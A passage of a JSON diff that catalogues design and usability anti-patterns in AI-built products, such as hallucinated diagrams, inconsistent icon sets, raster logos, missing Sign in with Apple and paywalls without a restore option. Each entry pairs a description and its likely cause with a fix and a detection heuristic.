+  "harm": "Clarity",
+  "origin": "Training data",
+  "oneLiner": "AI features illustrated with circuit-board brains, blue code rain and a robot hand reaching for a human one.",
+  "looksLike": "The hero for an AI feature shows a translucent brain made of glowing circuits, or a white humanoid robot looking thoughtful. Everything is deep blue with cyan light. Sometimes a robot finger almost touches a human finger, like the Sistine Chapel ceiling.",
+  "why": "Ask an image model for 'artificial intelligence' and it returns the most common visual cliche in its training data, which is decades of sci-fi stock art. The cliche costs nothing to produce, so it fills every slot where a real product shot should go.",
+  "who": "Readers get a false picture of what the product does and how capable it is, and the human choices behind the system disappear.",
+  "theFix": "Show the actual feature: a real screenshot, the input and the output, or the people who use it. If you need an illustration, brief the tool on the task the product does, not on 'AI'.",
+  "heur": "Human review: does the image show the product or the task, or does it show a brain, a robot or blue code?",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Why we need better images of AI",
+    "u": "https://www.turing.ac.uk/blog/why-we-need-better-images-ai"
+   }
+  ],
+  "code": "A165",
+  "rel": [
+   "floating-3d-nothing",
+   "uncanny-stock-humans",
+   "torn-edge-mask"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-hallucinated-diagram",
+  "name": "The Hallucinated Diagram",
+  "track": "surface",
+  "group": "Generated content",
+  "category": "Imagery",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Maps, figures and infographics drawn by an image model, with invented place names and nonsense labels.",
+  "looksLike": "A forecast map labels towns that do not exist. A science figure has labels like 'testtomcels' and arrows pointing at nothing. At thumbnail size it looks authoritative, so nobody reads it.",
+  "why": "Image models paint the look of a diagram, not its facts. The US National Weather Service pulled a map that showed invented towns after a local office used generative AI for the base map, and a journal retracted a paper whose Midjourney figures were covered in gibberish.",
+  "who": "Readers act on wrong information, and institutions lose the trust that made their diagrams worth reading.",
+  "theFix": "Build maps and charts from real data with a charting or mapping tool. Never let an image model draw labels, numbers or geography.",
+  "heur": "Human review: read every label on a diagram and check it against the source data; OCR the image and spell-check the output.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "An AI-Generated NWS Map Invented Fake Towns In Idaho",
+    "u": "https://tech.slashdot.org/story/26/01/07/0014200/"
+   },
+   {
+    "t": "A ridiculous AI-generated rat penis made it into a peer-reviewed journal",
+    "u": "https://popsci.com/technology/ai-rat-journal"
+   }
+  ],
+  "code": "A166",
+  "rel": [
+   "the-pseudo-ui-screenshot",
+   "broken-or-placeholder-image",
+   "the-memorised-stock-photo"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-mismatched-icon-set",
+  "name": "The Mismatched Icon Set",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Iconography",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "Custom icons generated one at a time, so stroke width, corners and detail drift across the set.",
+  "looksLike": "One icon has a 2px stroke and rounded ends, the next is thicker with square corners, a third is filled and over-detailed. Some are blurry PNGs beside crisp SVGs. In a row they look like three different products.",
+  "why": "Identical prompts give slightly different interpretations each time, and generators have no shared memory between icons and no icon-specific controls. They also tend to output raster images rather than vectors.",
+  "who": "Users read inconsistent icons as inconsistent meaning, and the icons blur at small sizes and high density screens.",
+  "theFix": "Generate the set in one batch from a strict spec, then normalise stroke, radius and grid in a vector editor. Or use one established icon family.",
+  "heur": "Code check: compare stroke-width and viewBox across inline SVG icons and flag raster icons in the same component set.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Can AI design unique, consistent icon sets from a simple style brief?",
+    "u": "https://www.jeffbullas.com/thread/can-ai-design-unique-consistent-icon-sets-from-a-simple-style-brief/"
+   },
+   {
+    "t": "The Consistency Problem With AI Icon Generation",
+    "u": "https://iconly.ai/blog/generate-matching-icon-set-ai/"
+   }
+  ],
+  "code": "A167",
+  "rel": [
+   "emoji-as-icons",
+   "icon-in-a-tinted-tile",
+   "the-lucide-house-style"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-obligatory-header-image",
+  "name": "The Obligatory Header Image",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Content",
+  "harm": "Credibility",
+  "origin": "Business",
+  "oneLiner": "Every blog post opens with a generated image that has nothing to do with the article.",
+  "looksLike": "A post about invoicing opens with a glossy scene of a person staring at floating holograms. Every post in the archive has one, all in the same style. The image adds no information and pushes the first paragraph below the fold.",
+  "why": "Templates and CMS themes leave a featured-image slot, and generating a filler image takes seconds. Surveys cited by practitioners report trust drops sharply for content readers suspect is AI-made.",
+  "who": "Readers scroll past noise and may doubt the rest of the writing is real, and slow connections load a large image for nothing.",
+  "theFix": "Leave the image out unless it explains something: a chart, a screenshot, a real photo. Let the theme handle posts with no image.",
+  "heur": "Human review: for each header image, ask what it tells the reader that the title does not.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Laying AI-generated header images aside",
+    "u": "https://birchtree.me/blog/done-with-ai-generated-images/"
+   },
+   {
+    "t": "Are AI-generated images hurting your blog engagement? What the 2026 research shows about generic visuals, reading time, and reader trust",
+    "u": "https://kompozy.io/guides/ai-generated-images-hurt-blog-engagement"
+   }
+  ],
+  "code": "A168",
+  "rel": [
+   "the-conclusion-heading",
+   "prompt-as-alt-text",
+   "the-evolving-landscape-opener"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-pseudo-ui-screenshot",
+  "name": "The Pseudo-UI Screenshot",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Trust",
+  "origin": "Model",
+  "oneLiner": "The 'product preview' is a generated image of an app, with letter-like squiggles where labels should be.",
+  "looksLike": "A laptop or phone mockup shows a convincing dashboard, but zoom in and the menu reads 'Dashbrod', the numbers are nonsense and the buttons have no words. The interface shown is not the product.",
+  "why": "Diffusion models treat letters as pixel patterns, not language, so dense small text comes out as plausible shapes. It is faster to generate a product shot than to design and screenshot a real screen.",
+  "who": "Buyers form expectations from an interface that does not exist and spot the gibberish as a sign the product is not real.",
+  "theFix": "Use real screenshots, or a designed mockup with real copy. If you generate a device frame, composite a real screenshot into it.",
+  "heur": "Render check: OCR product-preview images and flag low dictionary-word ratios.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "AI Image Generators Can't Render Text. Here's Why (And 4 Fixes That Actually Work)",
+    "u": "https://dev.to/klement_gunndu_e16216829c/ai-image-generators-cant-render-text-heres-why-and-4-fixes-that-actually-work-3i8o"
+   },
+   {
+    "t": "Introducing 4o Image Generation",
+    "u": "https://openai.com/index/introducing-4o-image-generation/"
+   }
+  ],
+  "code": "A169",
+  "rel": [
+   "the-fake-dashboard",
+   "uncanny-stock-humans",
+   "broken-or-placeholder-image"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-raster-logo",
+  "name": "The Raster Logo",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Branding",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "The logo exists only as a generated PNG, so it blurs on retina screens, banners and print.",
+  "looksLike": "The header logo is a 1024px PNG scaled down, soft at the edges. The favicon is a muddy blur. On a dark background it sits in a white box, and the print banner looks pixelated.",
+  "why": "Most AI image and logo generators export pixel formats, not vectors. Exporting a bigger PNG is still a raster file, so the brand has no master artwork.",
+  "who": "The brand looks cheap wherever it is shown large or small, and every new use needs a workaround.",
+  "theFix": "Redraw the logo as SVG with real type, and export favicons and app icons from that master.",
+  "heur": "Code check: flag logo elements that are .png, .jpg or .webp instead of SVG, and favicons generated from a large raster.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How to Make High Resolution Files from Your AI Logo",
+    "u": "https://logogeek.uk/?p=7679"
+   },
+   {
+    "t": "Traps when creating a logo using an AI generator",
+    "u": "https://fluxcreative.treepl.co/insights/traps-when-creating-a-logo-using-an-ai-generator"
+   }
+  ],
+  "code": "A170",
+  "rel": [
+   "the-shapeshifting-mascot",
+   "the-unownable-logo",
+   "trusted-by-nobody"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-shapeshifting-mascot",
+  "name": "The Shapeshifting Mascot",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Branding",
+  "harm": "Clarity",
+  "origin": "Model",
+  "oneLiner": "The brand character or product looks slightly different in every generated image.",
+  "looksLike": "The mascot's ears, colour and proportions change between the homepage, onboarding and the email. Product shots in one carousel show different buttons, labels or handle shapes. Users cannot tell which version is the real thing.",
+  "why": "Image models have no persistent memory of an identity. Each image starts from new random noise and the description is interpreted afresh, so the same prompt returns different faces, proportions and details.",
+  "who": "Users lose a stable brand cue, and shoppers may receive a product that differs from some of the images.",
+  "theFix": "Lock the character with a reference sheet or a trained reference and reuse it, or draw it once as a vector. For products, photograph the real item.",
+  "heur": "Human review: line up every appearance of the mascot or product and check that shape, colour and details match.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How to Create Consistent Characters with AI (2026 Guide)",
+    "u": "https://getimg.ai/blog/how-to-create-consistent-characters-with-ai"
+   }
+  ],
+  "code": "A171",
+  "rel": [
+   "borrowed-house-style",
+   "the-raster-logo",
+   "trusted-by-nobody"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-sparkle-in-the-corner",
+  "name": "The Sparkle in the Corner",
+  "track": "surface",
+  "group": "Provenance",
+  "category": "Imagery",
+  "harm": "Credibility",
+  "origin": "Tool default",
+  "oneLiner": "A generator's visible watermark ships in a published image or turns into an object in later edits.",
+  "looksLike": "A small star or logo sits in the corner of a hero or product image. When the image is extended or animated, the mark becomes part of the scene and moves or warps with it.",
+  "why": "Some tools now add a visible mark to free or studio outputs. Users report Google's star watermark on Nano Banana images, and that video tools treat it as a real object across frames.",
+  "who": "The brand publishes a tool's mark on its own work, and downstream edits break.",
+  "theFix": "Generate with a plan or tier that gives a clean master, or disclose generation in a caption, and check the final asset for marks before use. Do not remove watermarks in ways that break licence terms.",
+  "heur": "Render check: inspect image corners for small high-contrast logo or star marks.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Regression: forced visible STAR watermark breaks Gemini Nano Banana Pro image-to-image and Flow frame-to-video workflows",
+    "u": "https://discuss.ai.google.dev/t/regression-forced-visible-star-watermark-breaks-gemini-nano-banana-pro-image-to-image-and-flow-frame-to-video-workflows/114193"
+   }
+  ],
+  "code": "A172",
+  "rel": [
+   "stripped-content-credentials",
+   "text-baked-into-the-banner",
+   "the-baked-in-checkerboard"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-unownable-logo",
+  "name": "The Unownable Logo",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Branding",
+  "harm": "Money",
+  "origin": "Tool default",
+  "oneLiner": "A logo from an AI generator that cannot be copyrighted and may resemble someone else's mark.",
+  "looksLike": "A tidy abstract swoosh or gradient monogram that looks like many other startups. The founder assumes they own it. A trademark search later turns up a similar mark, or the tool's terms grant only non-exclusive rights.",
+  "why": "Copyright protects human authorship, so a logo from a simple prompt is generally not protected. Generators build on common templates and styles, so outputs can be generic or close to existing marks.",
+  "who": "Founders spend on a brand they cannot defend, and may face a rebrand or a dispute after launch.",
+  "theFix": "Treat AI output as a sketch: have a person redraw and develop it, run reverse image and trademark searches, and read the tool's licence before use.",
+  "heur": "Human review: confirm a reverse image search, a trademark search and the generator's licence terms are on file.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Can You Copyright or Trademark a Logo Designed by AI?",
+    "u": "https://www.illinoislawyernow.com/2023/12/can-you-copyright-or-trademark-a-logo-designed-by-ai/"
+   },
+   {
+    "t": "Traps when creating a logo using an AI generator",
+    "u": "https://fluxcreative.treepl.co/insights/traps-when-creating-a-logo-using-an-ai-generator"
+   }
+  ],
+  "code": "A173",
+  "rel": [
+   "trusted-by-nobody",
+   "the-raster-logo",
+   "the-builder-s-watermark"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-unscannable-art-qr",
+  "name": "The Unscannable Art QR",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Marketing",
+  "harm": "Productivity",
+  "origin": "Tool default",
+  "oneLiner": "A QR code blended into AI artwork so well that phones fail to read it.",
+  "looksLike": "Posters and packaging show a striking illustration where the QR pattern hides in buildings or leaves. Some phones read it, many do not, and there is no printed URL as a fallback.",
+  "why": "ControlNet-style generation trades scannability for looks: stronger blending makes the code less readable. Research found a common baseline model scanned only 60% of the time.",
+  "who": "People with older phones or bad light cannot reach the offer, and the campaign loses the very users it printed for.",
+  "theFix": "Test the code on several phones and scanner apps at real print size, keep the finder squares crisp, and print a short URL beside it.",
+  "heur": "Render check: decode the final image with a standard QR library at reduced size and contrast; flag if it fails.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Stable Diffusion QR Code 101",
+    "u": "https://antfu.me/posts/ai-qrcode-101"
+   },
+   {
+    "t": "DiffQRCoder: Diffusion-based Aesthetic QR Code Generation with Scanning Robustness Guided Iterative Refinement",
+    "u": "https://arxiv.org/html/2409.06355v1"
+   }
+  ],
+  "code": "A174",
+  "rel": [
+   "rendered-before-it-exists",
+   "retouched-into-fiction",
+   "ai-washed-rules-engine"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "the-yellow-cast",
+  "name": "The Yellow Cast",
+  "track": "surface",
+  "group": "Imagery & icons",
+  "category": "Imagery",
+  "harm": "Credibility",
+  "origin": "Model",
+  "oneLiner": "Generated images share a warm yellow-brown tint that makes whites look cream and skin look jaundiced.",
+  "looksLike": "White walls, shirts and product backgrounds drift toward beige. Shadows look muddy and every scene seems lit at golden hour. Put several images from one site side by side and they share the same sepia wash.",
+  "why": "Practitioners trace it to ChatGPT image generation, where prompt rewriting adds cinematic lighting words and preference tuning seems to reward warm, flattering tones. With no lighting in the prompt, the model falls back on a warm default.",
+  "who": "Brands lose colour accuracy, product colours look wrong, and the tint marks the image as generated to anyone who has seen the pattern.",
+  "theFix": "Ask for neutral white balance and daylight, around 6000 to 7000K, and avoid words like 'cinematic'. Or correct white balance after generation before publishing.",
+  "heur": "Render check: sample pixels that should be neutral white or grey and flag when the blue channel sits well below red and green.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "ChatGPT’s ‘piss filter’: why AI images skew yellow (and how to fix it)",
+    "u": "https://www.popularai.org/p/chatgpts-piss-filter-why-ai-images"
+   }
+  ],
+  "code": "A175",
+  "rel": [
+   "uncanny-stock-humans",
+   "hand-coded-svg-filler",
+   "gradient-initial-avatars"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "calories-to-the-digit",
+  "name": "Calories To The Digit",
+  "track": "surface",
+  "group": "Transparency",
+  "category": "Healthcare",
+  "harm": "Wellbeing",
+  "origin": "Model",
+  "oneLiner": "A food photo returns one exact calorie number with no range, even though photo estimates miss by a lot.",
+  "looksLike": "Snap a meal and the app shows '612 kcal, 28g fat' as a precise figure. Nothing says it is an estimate or how much it can be off.",
+  "why": "Vision models return a single best guess, and a crisp number looks better than a range. NIH researchers testing four photo calorie apps on over 100 meals found they underestimated calories and fat by about a third.",
+  "who": "People managing weight, diabetes or eating disorders make decisions on numbers that are far off.",
+  "theFix": "Show estimates as ranges, say what the photo could not see, and make portion and ingredient correction easy.",
+  "heur": "Look at the result screen: a single precise value with no range, caveat or edit control is a flag.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "How Accurate Are Photo-Based Calorie Apps? 4 Are Put To The Test",
+    "u": "https://www.healthday.com/health-news/nutrition/how-accurate-are-photo-based-calorie-apps-4-are-put-to-the-test"
+   }
+  ],
+  "code": "A176",
+  "rel": [
+   "the-avatar-explainer",
+   "mobile-gets-seven-days",
+   "i-ll-get-back-to-you"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "delete-button-in-every-row",
+  "name": "Delete Button In Every Row",
+  "track": "surface",
+  "group": "Components",
+  "category": "Mobile",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "Always-visible destructive buttons in every list row, carried over from hover-style web layouts.",
+  "looksLike": "Each item in a list shows a red trash icon or 'Delete' next to it at all times. A slightly off scroll tap removes an item.",
+  "why": "On the web these actions often appear on hover, and models keep them visible on mobile because touch has no hover. Practitioners name always-visible destructive buttons in list rows as a mobile rule agents get wrong.",
+  "who": "Users lose items by accident while scrolling or tapping nearby.",
+  "theFix": "Move destructive actions into a swipe action with a visible alternative, a long-press menu or the detail screen, and offer undo.",
+  "heur": "Render list screens and flag rows where a destructive control is visible by default next to the main tap area.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   }
+  ],
+  "code": "A177",
+  "rel": [
+   "the-hand-rolled-switch",
+   "google-only-sign-in",
+   "the-map-everything-feed"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "frozen-type-size",
+  "name": "Frozen Type Size",
+  "track": "surface",
+  "group": "Accessibility",
+  "category": "Mobile",
+  "harm": "Accessibility",
+  "origin": "Tool default",
+  "oneLiner": "Text that ignores the phone's text size setting, or breaks out of fixed-height boxes when it does scale.",
+  "looksLike": "Turn on large text in system settings and the app looks the same, or labels clip inside fixed-height buttons and cards. Web fonts are used instead of the system font.",
+  "why": "AI builders bring web habits: imported web fonts, fixed heights and pixel sizes. Platform text sizes can grow far beyond the default, and layouts need to reflow, not just wrap.",
+  "who": "People with low vision cannot read the app, or the larger text overlaps and hides controls.",
+  "theFix": "Use system text styles that respect Dynamic Type and font scaling, avoid fixed heights on text containers, and test at the largest accessibility sizes.",
+  "heur": "Search for allowFontScaling={false} and fixed height on views that contain Text; render screens at the largest accessibility text size.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   },
+   {
+    "t": "How to Make an iOS App Look Native (2026)",
+    "u": "https://vp0.com/blogs/how-to-make-ios-app-look-native"
+   },
+   {
+    "t": "Text · React Native",
+    "u": "https://reactnative.dev/docs/text"
+   }
+  ],
+  "code": "A178",
+  "rel": [
+   "no-report-button-on-generated-content",
+   "tap-targets-sized-for-a-cursor",
+   "notification-summary-inversion"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "glass-over-content",
+  "name": "Glass Over Content",
+  "track": "surface",
+  "group": "Colour & type",
+  "category": "Mobile",
+  "harm": "Accessibility",
+  "origin": "Training data",
+  "oneLiner": "iOS 26 Liquid Glass effects applied to cards and content, not just navigation controls.",
+  "looksLike": "List rows, cards and text panels all sit on translucent glass. Text over photos becomes hard to read, and glass sits stacked on more glass.",
+  "why": "Models and prompts chase the newest Apple look and apply it everywhere. Practitioner guidance keeps Liquid Glass to the navigation and controls layer, and NN/g found even Apple's own use hurt legibility over busy backgrounds.",
+  "who": "Readers with low vision or in bright light cannot read content whose contrast changes with what is behind it.",
+  "theFix": "Keep glass to bars and controls, keep content on solid backgrounds, never stack glass on glass, and check contrast over the busiest background.",
+  "heur": "Search for glassEffect or blur materials on content containers, and render text over photos to check contrast.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   },
+   {
+    "t": "Liquid Glass Is Cracked, and Usability Suffers in iOS 26",
+    "u": "https://www.nngroup.com/articles/liquid-glass/"
+   }
+  ],
+  "code": "A179",
+  "rel": [
+   "the-recoloured-template-app",
+   "delete-button-in-every-row",
+   "no-report-button-on-generated-content"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "google-only-sign-in",
+  "name": "Google-Only Sign-In",
+  "track": "surface",
+  "group": "Components",
+  "category": "Mobile",
+  "harm": "Autonomy",
+  "origin": "Tool default",
+  "oneLiner": "The iOS app offers Google sign-in and email, but no Sign in with Apple.",
+  "looksLike": "The login screen has 'Continue with Google' and an email field. On wrapped apps the Google page may load inside the WebView, where Google blocks it.",
+  "why": "AI builders wire up the auth provider their backend template makes easiest, often Google OAuth through Supabase. Apple's rule 4.8 requires an equivalent privacy-focused login, in practice Sign in with Apple, when a third-party social login is offered.",
+  "who": "Users who want a private login have none, and the app is rejected at review.",
+  "theFix": "Add Sign in with Apple with a native flow, and open any Google sign-in in the system browser or a native SDK rather than a WebView.",
+  "heur": "On iOS builds, if the login screen shows a Google, Facebook or other social button, confirm a Sign in with Apple button is also present.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Lovable to the App Store: What the Wrapper Guides Don't Tell You",
+    "u": "https://foresightmobile.com/blog/lovable-to-app-store"
+   },
+   {
+    "t": "Native configuration and requirements matrix | Expo Supabase SaaS Kit",
+    "u": "https://makerkit.dev/docs/md/react-native-supabase/config-requirements"
+   },
+   {
+    "t": "App Review - 4.8.0 Design: Login Services",
+    "u": "https://developer.apple.com/forums/thread/765145"
+   }
+  ],
+  "code": "A180",
+  "rel": [
+   "delete-button-in-every-row",
+   "the-hand-rolled-switch",
+   "the-recoloured-template-app"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "hamburger-in-a-native-app",
+  "name": "Hamburger In A Native App",
+  "track": "surface",
+  "group": "Components",
+  "category": "Navigation",
+  "harm": "Clarity",
+  "origin": "Training data",
+  "oneLiner": "A web-style hamburger menu hides the main sections of a phone app that has only four or five.",
+  "looksLike": "The app opens to a header with a three-line icon on the left. Home, History, Settings and Profile sit inside a slide-out drawer, and there is no tab bar.",
+  "why": "Web-first AI builders port responsive website navigation into apps. Practitioners checking AI-built apps say to use tab bars and platform back behaviour, not hamburger menus, and NN/g found fully hidden menus hurt discovery.",
+  "who": "Users do not find features they cannot see, and the app feels like a website.",
+  "theFix": "Use a tab bar for three to five top-level destinations, and reserve drawers for large secondary sets.",
+  "heur": "Check the root navigator: a drawer as the only top-level navigation with five or fewer destinations is a flag.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "The AI-Built App Design Checklist: Six Passes That Catch It All",
+    "u": "https://vp0.com/blogs/ai-built-app-design-checklist"
+   },
+   {
+    "t": "How to Make an iOS App Look Native (2026)",
+    "u": "https://vp0.com/blogs/how-to-make-ios-app-look-native"
+   },
+   {
+    "t": "Beyond the Hamburger: What Makes Navigation Discoverable on Mobile",
+    "u": "https://www.nngroup.com/articles/find-navigation-mobile-even-hamburger/"
+   }
+  ],
+  "code": "A181",
+  "rel": [
+   "coming-soon-navigation",
+   "search-that-s-just-filter",
+   "filters-that-won-t-combine"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "keyboard-eats-the-composer",
+  "name": "Keyboard Eats The Composer",
+  "track": "surface",
+  "group": "Input & feedback",
+  "category": "Mobile",
+  "harm": "Productivity",
+  "origin": "Model",
+  "oneLiner": "The on-screen keyboard slides up and covers the text field the user is typing into.",
+  "looksLike": "Tap the chat input or the last form field and the keyboard hides it, so you type blind. Sometimes a KeyboardAvoidingView is present but with the same behavior on both platforms and no offset, so the field ends half covered or jumps.",
+  "why": "Generated screens are written and previewed without a keyboard open. When the model adds KeyboardAvoidingView it copies one snippet, though iOS and Android need different behavior values and an offset for native headers.",
+  "who": "Users of AI chat and form screens cannot see what they type, and often give up on long inputs.",
+  "theFix": "Use a keyboard-aware approach per platform, or react-native-keyboard-controller for chat screens, and test every input with the keyboard open on both platforms.",
+  "heur": "Open each screen with a TextInput near the bottom, focus it, and check the input and the send button stay fully visible above the keyboard on iOS and Android.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Keyboard handling",
+    "u": "https://docs.expo.dev/guides/keyboard-handling/"
+   },
+   {
+    "t": "The Mobile UI/UX Rules AI Agents Get Wrong",
+    "u": "https://vmobify.com/blog/mobile-ui-ux-rules-ai-agents-get-wrong"
+   },
+   {
+    "t": "ChatGPT Prompt to Fix a React Native Layout (Done Right)",
+    "u": "https://vp0.com/blogs/chatgpt-prompt-to-fix-react-native-layout"
+   }
+  ],
+  "code": "A182",
+  "rel": [
+   "errors-nobody-announces",
+   "notification-summary-inversion",
+   "frozen-type-size"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "no-report-button-on-generated-content",
+  "name": "No Report Button On Generated Content",
+  "track": "behavioral",
+  "group": "Safety",
+  "category": "Mobile",
+  "harm": "Safety",
+  "origin": "Business",
+  "oneLiner": "An app that generates images or text for users offers no way to filter or report harmful output.",
+  "looksLike": "The app creates avatars, stories or chat replies and shares them in a feed. There is no Report, Block or Hide option on the output.",
+  "why": "Builders treat model output as the product and skip moderation tooling. Apple's rule 1.2 applies to AI-generated content too, and review guides list missing filtering and reporting as a rejection cause for AI apps.",
+  "who": "Users, including minors, are exposed to harmful output with no way to flag it.",
+  "theFix": "Add a Report option on every generated item, filter outputs before display, and give users a way to block other users where content is shared.",
+  "heur": "Render any screen that shows generated or shared content and check for a report or flag control.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "Does Apple Reject AI-Generated Apps? How to Get Approved | VP0 Journal",
+    "u": "https://vp0.com/blogs/does-apple-reject-ai-generated-apps"
+   }
+  ],
+  "code": "B190",
+  "rel": [
+   "frozen-type-size",
+   "the-edible-verdict",
+   "the-key-in-the-bundle"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "no-way-to-delete-the-account",
+  "name": "No Way To Delete The Account",
+  "track": "behavioral",
+  "group": "Data & consent",
+  "category": "Mobile",
+  "harm": "Privacy",
+  "origin": "Tool default",
+  "oneLiner": "Users can create an account in seconds but cannot delete it anywhere in the app.",
+  "looksLike": "Settings has Log out and maybe Edit profile. Deleting means emailing support, visiting a website with no link, or only 'deactivating'. If Sign in with Apple is used, the Apple token is never revoked.",
+  "why": "Generated auth flows cover sign-up and login, because that is what the prompt asked for. Backend templates such as Supabase do not handle Apple token revocation on deletion, so it is left out.",
+  "who": "Users cannot remove their personal data, and the app breaks Apple's in-app account deletion rule.",
+  "theFix": "Add a Delete account option in account settings that removes the account and its data, explains timing and billing, and revokes Sign in with Apple tokens.",
+  "heur": "Search the settings screens for a delete-account action that calls a server deletion endpoint; flag apps with sign-up but no such path.",
+  "sightings": "",
+  "sources": [
+   {
+    "t": "5.1.1(v) - Offering account deletion in your app",
+    "u": "https://developer.apple.com/help/app-review/guideline-reference/5-1-1-account-deletion"
+   },
+   {
+    "t": "No-Code App Builders and App Store Review Guidelines | Superapp",
+    "u": "https://superapp.dev/blog/no-code-app-builder-app-store-approval.md"
+   },
+   {
+    "t": "Native configuration and requirements matrix | Expo Supabase SaaS Kit",
+    "u": "https://makerkit.dev/docs/md/react-native-supabase/config-requirements"
+   }
+  ],
+  "code": "B191",
+  "rel": [
+   "permission-for-the-picker",
+   "permission-wall-at-launch",
+   "photos-sent-to-someone-else-s-ai"
+  ],
+  "tier": "sourced",
+  "observed": "",
+  "version": "1.0",
+  "added": "2026-10-23",
+  "updated": "2026-10-23",
+  "detect": "judgement"
+ },
+ {
+  "id": "paywall-with-no-restore",
+  "name": "Paywall With No Restore",
+  "track": "surface",
+  "group": "Money",
+  "category": "Pricing",
+  "harm": "Money",
+  "origin": "Model",
+  "oneLiner": "A polished subscription paywall with a buy button and no Restore Purchases option.",
+  "looksLike": "The paywall has plan cards, a glowing Continue button and small print, but no Restore link. A user on a new phone has to pay again or contact support.",
+  "why": "Models generate the visible purchase flow and skip the compliance parts. Apple rule 3.1.1 requires apps that sell subscriptions or non-consumables to let users restore them.",
+  "who": "Paying users lose access they bought, and the app is rejected at review.",
